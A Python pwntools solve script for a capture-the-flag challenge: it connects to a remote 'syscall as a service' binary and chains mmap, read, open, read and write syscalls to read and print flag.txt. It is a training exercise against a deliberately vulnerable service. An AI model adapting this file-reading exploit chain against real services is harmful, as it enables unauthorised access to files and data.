# RazviOverflow
# Python3

from pwn import *
import sys

#binary = process("saas")
binary = remote("jh2i.com", 50016)

'''
Enter rax (decimal): 0
Enter rdi (decimal): 0
Enter rsi (decimal): 0
Enter rdx (decimal): 0
Enter r10 (decimal): 0
Enter r9 (decimal): 0
Enter r8 (decimal): 0
Rax: 0x0
'''

# Syscalls:
# 		rax, rdi, rsi, rdx, r10, r9, r8
mmap = [9, 0, 4096, 3, 33, 0, 0]

print(binary.recv())
message = ""
for value in mmap:
	binary.sendline(str(value))
	message = binary.recv()
	print(message)


address = int(message.split(b"\n")[0].split(b"0x")[1], 16)

print("Address of buffer is -> " + hex(address))

read = [0, address, 8, 0, 0, 0]

binary.sendline(str(0))
for value in read:
	print(binary.recv())
	binary.sendline(str(value))
	
binary.sendline("flag.txt")
print(binary.recv())

open_function = [address, 0, 0, 0, 0, 0]

binary.sendline(str(2))

for value in open_function:
	binary.sendline(str(value))
	message = binary.recv()
	print(message)
message = binary.recv()
file_descriptor = int(message.split(b"\n")[0].split(b"0x")[1], 16)
print("File descriptor of flag.txt -> " + hex(file_descriptor))

read = [file_descriptor, address, 100, 0, 0, 0]

binary.sendline(str(0))

for value in read:
	print(binary.recv())
	binary.sendline(str(value))
	

write = [1, address, 100, 0, 0, 0]

binary.sendline(str(1))

for value in write:
	print(binary.recv())
	binary.sendline(str(value))

binary.interactive()